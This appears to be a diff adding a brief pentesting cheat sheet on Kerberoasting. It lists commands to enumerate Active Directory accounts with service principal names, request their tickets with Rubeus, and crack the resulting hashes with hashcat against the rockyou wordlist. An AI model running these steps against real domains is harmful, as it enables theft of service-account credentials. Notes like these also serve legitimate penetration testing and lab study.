@@ -1,0 +1,7 @@
+#Kerberos
+SPN
+PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName 
+
+Rubeus kerberoast 
+hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt 
+
